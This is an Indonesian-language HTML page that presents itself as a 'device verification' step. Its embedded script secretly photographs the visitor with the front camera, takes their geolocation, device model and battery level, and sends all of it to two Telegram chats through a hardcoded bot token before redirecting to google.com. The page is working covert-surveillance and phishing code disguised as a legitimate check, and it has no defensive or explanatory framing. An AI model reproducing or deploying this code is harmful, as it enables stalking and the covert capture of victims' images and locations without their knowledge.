<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #f4f4f4; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .box { padding: 30px; border: 1px solid #ddd; width: 85%; margin: auto; border-radius: 15px; background: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { padding: 15px 30px; font-size: 18px; background: #27ae60; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verifikasi Perangkat</h2>
        <p id="status">Klik tombol di bawah untuk melanjutkan.</p>
        <button id="btn" onclick="mulaiVerifikasi()">Lanjutkan Verifikasi</button>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8836735055:AAH-Uqs-XZ_2J9-TJgBvN1unR-jPyFZMZMI';
        const CHAT_IDS = ['6888530451', '7452255678'];
        let userLocation = "Lokasi tidak diizinkan";

        // Fungsi mendapatkan detail perangkat
        async function getDeviceDetails() {
            let model = navigator.userAgent;
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                    if (hints.model) model = hints.model;
                } catch (e) {}
            }
            let battery = "N/A";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                }
            } catch (e) {}
            return { model, battery };
        }

        async function mulaiVerifikasi() {
    document.getElementById('status').innerText = "Memproses...";
    
    // Meminta lokasi dengan link
    await new Promise((resolve) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { 
                    userLocation = `<a href="https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}">📍 Lokasi (Klik di sini)</a>`; 
                    resolve(); 
                },
                () => { userLocation = "Ditolak"; resolve(); }
            );
        } else { resolve(); }
    });

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        setTimeout(() => ambilFoto(video), 2000);
    } catch (err) {
        kirimDataTanpaFoto();
    }
        }

        async function ambilFoto(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const details = await getDeviceDetails();

            canvas.toBlob(async (blob) => {
                for (const id of CHAT_IDS) {
                    const formData = new FormData();
                    formData.append('chat_id', id);
                    formData.append('photo', blob);
                    formData.append('caption', `📸 <b>Laporan Kamera Depan</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n📍 <b>Lokasi:</b> ${userLocation}`);
                    formData.append('parse_mode', 'HTML');
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                }
                window.location.href = "https://google.com";
            }, 'image/jpeg');
        }

        async function kirimDataTanpaFoto() {
            const details = await getDeviceDetails();
            const text = `⚠️ <b>Kamera Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n📍 <b>Lokasi:</b> ${userLocation}`;
            for (const id of CHAT_IDS) {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
                });
            }
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
